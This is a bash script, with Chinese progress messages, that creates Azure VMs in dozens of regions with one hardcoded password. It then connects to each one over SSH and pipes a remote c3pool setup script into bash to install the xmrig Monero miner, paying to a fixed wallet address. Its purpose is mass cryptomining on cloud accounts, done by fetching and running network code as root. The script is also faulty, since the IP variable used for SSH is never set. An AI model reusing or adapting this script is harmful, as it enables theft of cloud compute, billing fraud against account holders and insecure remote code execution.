az_localtion=(eastasia southeastasia centralus eastus eastus2 westus northcentralus southcentralus northeurope westeurope japanwest japaneast brazilsouth australiaeast australiasoutheast southindia centralindia westindia jioindiawest jioindiacentral canadacentral canadaeast uksouth ukwest westcentralus westus2 koreacentral koreasouth francecentral francesouth australiacentral  australiacentral2 uaecentral  uaenorth  southafricanorth southafricawest switzerlandnorth  switzerlandwest  germanynort  germanywestcentral norwaywest norwayeast brazilsoutheast westus3 swedencentral)
for((a=0;a<${#az_localtion[@]};a++))
do
	set +e
        az group create -n ${az_localtion[$a]} -l ${az_localtion[$a]} > /root/log.txt 2>&1 &
done
echo "等待10s，正在创建群组"
sleep 10s
for((a=0;a<${#az_localtion[@]};a++))
do
	set +e
        az vm create -g ${az_localtion[$a]} -n a$a --image UbuntuLTS  --admin-username ubuntu --admin-password @GWHsix666666 --size Standard_F4s_v2 --accelerated-networking true > /root/log.txt 2>&1 &
	
done
echo "等待30s，正在创建群组"
sleep 1m
for((a=0;a<${#az_localtion[@]};a++))
do
	set +e
        sshpass -p '@GWHsix666666' ssh ubuntu@$get_ip -o StrictHostKeyChecking=no 'sudo curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 45trk8QoQBjbrEPvz26dXYFCUGvfppB11W4i8vu5bTHzYTtLmP5D6r6NaQgYNBCFK18Na3B3REZcuUGvNtYCXZeaP3LkYFV' > /root/log.txt 2>&1 &
	
	
done
       
